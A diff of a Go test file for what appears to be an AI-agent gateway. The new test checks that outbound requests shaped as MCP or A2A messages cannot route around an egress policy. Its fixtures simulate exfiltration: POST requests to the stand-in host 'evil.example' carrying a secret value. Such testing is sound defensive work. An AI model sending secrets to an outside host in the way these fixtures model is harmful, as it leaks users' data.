@@ -96,10 +96,42 @@ func TestEgressPart_DisabledOrResponse(t *testing.T) {
 			t.Fatalf("response=%v egress=%v: entity = %s/%s parts = %+v", tc.response, tc.egress, et, en, parts)
 		}
 	}
-	// A parsed request is never presented as egress.
-	pctx.Extensions.MCP = &pipeline.MCPExtension{Method: "tools/list"}
-	if _, et, _ := pctxToCMFParts(pctx, false, true); et != "" {
-		t.Fatalf("mcp request presented as %s", et)
+}
+
+// With synthetic egress on, any outbound request that names no entity is
+// presented as http_egress, whatever parser claimed it: a body shaped as
+// an MCP protocol method or an A2A message must not route around the
+// egress policy. A named entity keeps its route, and inbound requests are
+// never egress.
+func TestEgressPart_CoversUnnamedParsedRequests(t *testing.T) {
+	cases := map[string]pipeline.Extensions{
+		"mcp tools/list": {MCP: &pipeline.MCPExtension{Method: "tools/list", Params: map[string]any{"cursor": "s3cr3t"}}},
+		"mcp initialize": {MCP: &pipeline.MCPExtension{Method: "initialize"}},
+		"a2a":            {A2A: &pipeline.A2AExtension{Method: "message/send", Parts: []pipeline.A2APart{{Kind: "text", Content: "s3cr3t"}}}},
+		"unparsed":       {},
+	}
+	for name, ext := range cases {
+		pctx := egressRequest("POST", "evil.example", "/x", `{"x":"s3cr3t"}`, nil)
+		pctx.Extensions = ext
+		parts, et, en := pctxToCMFParts(pctx, false, true)
+		if et != "tool" || en != egressToolName || len(parts) != 1 || parts[0].Arguments["host"] != "evil.example" {
+			t.Errorf("%s: entity = %s/%s parts = %+v, want http_egress", name, et, en, parts)
+		}
+		pctx.Direction = pipeline.Inbound
+		if _, et, en := pctxToCMFParts(pctx, false, true); en == egressToolName {
+			t.Errorf("%s: inbound request presented as %s/%s", name, et, en)
+		}
+	}
+
+	named := egressRequest("POST", "tools.example", "/mcp", `{}`, nil)
+	named.Extensions.MCP = &pipeline.MCPExtension{Method: "tools/call", Params: map[string]any{"name": "get_weather"}}
+	if _, et, en := pctxToCMFParts(named, false, true); et != "tool" || en != "get_weather" {
+		t.Fatalf("named tool call presented as %s/%s", et, en)
+	}
+	llm := egressRequest("POST", "api.example", "/v1/messages", `{}`, nil)
+	llm.Extensions.Inference = &pipeline.InferenceExtension{Model: "m"}
+	if _, et, en := pctxToCMFParts(llm, false, true); et != entityTypeLLM || en != "m" {
+		t.Fatalf("inference presented as %s/%s", et, en)
 	}
 }
 
